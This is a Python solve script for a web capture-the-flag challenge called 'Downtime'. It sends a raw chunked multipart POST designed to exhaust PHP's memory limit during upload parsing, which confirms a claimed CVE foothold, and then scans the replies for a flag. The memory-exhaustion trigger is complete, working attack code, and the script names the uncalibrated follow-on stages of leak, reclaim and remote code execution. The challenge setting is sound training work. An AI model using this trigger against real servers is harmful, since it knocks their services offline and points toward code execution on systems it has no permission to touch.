#!/usr/bin/env ctf-python
"""Downtime (web, 400pts) - MetaCTF Flash, Oct 2026.

It drives the OOM (the proven foothold) and scans every response for the flag."""
# Runs three ways without edits:
#   CTF_LOCAL=1 ctf-python solve/solve.py       -> local docker replica
#   ctf-python solve/solve.py                   -> recorded target (sbhost)
#   CTF_TARGET='https://host' ctf-python ...    -> override
import os
import pathlib
import select
import socket
import ssl
import sys
import urllib.parse

_here = pathlib.Path(__file__).resolve()
for _p in _here.parents:
    if (_p / "lib" / "ctf.py").is_file():
        sys.path.insert(0, str(_p / "lib"))
        break
import ctf  # noqa: E402


def base_url() -> str:
    if os.environ.get("CTF_LOCAL"):
        return os.environ.get("CTF_LOCAL_URL", "http://127.0.0.1:8099")
    return ctf.target().get("url", "http://127.0.0.1:8099").rstrip("/")


def _connect(host, port, tls, timeout=90):
    raw = socket.create_connection((host, port), timeout=timeout)
    try:
        raw.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    except OSError:
        pass
    if not tls:
        return raw
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(raw, server_hostname=host)


def oom_trigger(url: str, path: str = "/index.php", cap_mb: int = 150) -> bytes:
    """Chunked multipart POST that exhausts memory_limit during rfc1867 parse."""
    u = urllib.parse.urlsplit(url)
    tls = u.scheme == "https"
    host, port = u.hostname, u.port or (443 if tls else 80)
    b = "OOMB"
    hdr = (
        f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"User-Agent: Mozilla/5.0\r\n"
        f"Content-Type: multipart/form-data; boundary={b}\r\n"
        f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
    ).encode()
    pre = f"--{b}\r\nContent-Disposition: form-data; name=\"x\"\r\n\r\n".encode()
    s = _connect(host, port, tls)
    s.sendall(hdr)

    def chunk(d):
        s.sendall(f"{len(d):x}\r\n".encode() + d + b"\r\n")

    resp = bytearray()
    sent = 0
    blk = b"A" * 65536
    target = cap_mb * 1024 * 1024
    try:
        chunk(pre)
        while sent < target:
            chunk(blk)
            sent += len(blk)
            # The worker OOMs and replies before we finish. Stop sending then.
            r, _, _ = select.select([s], [], [], 0)
            if r:
                d = s.recv(65536)
                if d:
                    resp.extend(d)
                    break
        else:
            chunk(f"\r\n--{b}--\r\n".encode())
            s.sendall(b"0\r\n\r\n")
    except OSError:
        pass
    try:
        s.settimeout(25)
        while True:
            d = s.recv(65536)
            if not d:
                break
            resp.extend(d)
    except OSError:
        pass
    finally:
        s.close()
    return bytes(resp)


def run(url: str) -> bytes:
    collected = bytearray()
    print(f"[*] target: {url}")

    print("[*] stage 0: confirm CVE-2026-109618 OOM is reachable (chunked bypass)")
    resp = oom_trigger(url)
    collected.extend(resp)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "(none)"
    oom = b"Allowed memory size" in resp
    print(f"    status: {status}")
    print(f"    OOM fatal present: {oom}   (503 page: {b'Down for maintenance' in resp})")
    if oom:
        print("[+] FOOTHOLD: SAPI OOM fires before app code -> vuln confirmed")
    else:
        print("[-] OOM not observed; body size or limits may differ here")

    # stage 1-3: 8.2.34 is uncalibrated; this chunked/128M path differs from public tools' CL/8M lab.
    print("[~] stage 1-3 (leak -> reclaim -> RCE): not calibrated for 8.2.34/this heap")

    return bytes(collected)


def main():
    out = run(base_url())
    # A calibrated RCE would echo the flag into the response; scan for it.
    ctf.win(out)


if __name__ == "__main__":
    main()
